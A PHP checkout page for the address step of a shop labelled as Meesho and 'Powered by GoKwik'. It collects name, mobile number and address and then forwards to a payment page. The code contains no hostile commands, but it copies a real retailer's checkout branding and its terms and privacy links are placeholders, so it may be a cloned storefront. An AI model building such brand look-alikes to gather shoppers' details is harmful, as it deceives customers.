<?php require 'config.php';
if(empty(getCart())) { header('Location: index.php'); exit; }
if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['save_address'])){
    $_SESSION['address'] = $_POST;
    header('Location: payment.php'); exit;
}
$addr = $_SESSION['address'] ?? [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Checkout – Meesho</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<?php include 'header.php'; ?>

<main class="co-main">
    <!-- Step bar -->
    <div class="step-bar">
        <div class="step done"><div class="step-dot">✓</div><span class="step-lbl">Cart</span></div>
        <div class="step active"><div class="step-dot">2</div><span class="step-lbl">Address</span></div>
        <div class="step"><div class="step-dot">3</div><span class="step-lbl">Payment</span></div>
        <div class="step"><div class="step-dot">4</div><span class="step-lbl">Summary</span></div>
    </div>

    <div class="co-page-heading">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style="vertical-align: middle; margin-right: 6px;">
            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" fill="#e91e8c"/>
            <circle cx="12" cy="9" r="2.5" fill="#fff"/>
        </svg>
        Address
    </div>

    <div class="co-form-card">
        <form method="POST" id="addressForm">
            <!-- Hidden field to detect form submission -->
            <input type="hidden" name="save_address" value="1">
            
            <div class="co-field-group">
                <label>Full Name</label>
                <input type="text" name="name" value="<?= htmlspecialchars($addr['name']??'') ?>" required>
            </div>
            <div class="co-field-group">
                <label>Mobile number</label>
                <input type="tel" name="mobile" value="<?= htmlspecialchars($addr['mobile']??'') ?>" required>
            </div>
            <div class="co-field-group">
                <label>Pincode</label>
                <input type="text" name="pincode" value="<?= htmlspecialchars($addr['pincode']??'') ?>" required>
            </div>
            <div class="co-row-2">
                <div class="co-field-group">
                    <label>City</label>
                    <input type="text" name="city" value="<?= htmlspecialchars($addr['city']??'') ?>">
                </div>
                <div class="co-field-group">
                    <label>State</label>
                    <input type="text" name="state" value="<?= htmlspecialchars($addr['state']??'') ?>">
                </div>
            </div>
            <div class="co-field-group">
                <label>House No., Building Name</label>
                <input type="text" name="house" value="<?= htmlspecialchars($addr['house']??'') ?>">
            </div>
            <div class="co-field-group">
                <label>Road name, Area, Colony</label>
                <input type="text" name="area" value="<?= htmlspecialchars($addr['area']??'') ?>">
            </div>
            <div class="co-footer-links">
                <a href="#">T&C</a> |
                <a href="#">Privacy</a> |
                <a href="#">#050d129</a>
            </div>
            <div class="co-powered">
                Powered by: GoKwik
            </div>
            <!-- Desktop visible button -->
            <button type="submit" class="co-submit-desktop" style="width:100%; background:#9F2089; color:white; border:none; border-radius:40px; padding:14px; font-size:1rem; font-weight:700; margin-top:16px;">Save Address and Continue</button>
        </form>
    </div>

    <!-- Mobile sticky button -->
    <div class="co-sticky-cta">
        <button type="button" id="stickySubmitBtn">Save Address and Continue</button>
    </div>
</main>

<script>
    // Sticky button triggers form submission
    document.getElementById('stickySubmitBtn').addEventListener('click', function(e) {
        document.getElementById('addressForm').submit();
    });
</script>

<style>
    /* Hide desktop button on mobile, hide sticky on desktop */
    @media (max-width: 768px) {
        .co-submit-desktop {
            display: none;
        }
    }
    @media (min-width: 769px) {
        .co-sticky-cta {
            display: none;
        }
    }
</style>

<?php include 'footer.php'; ?>
</body>
</html>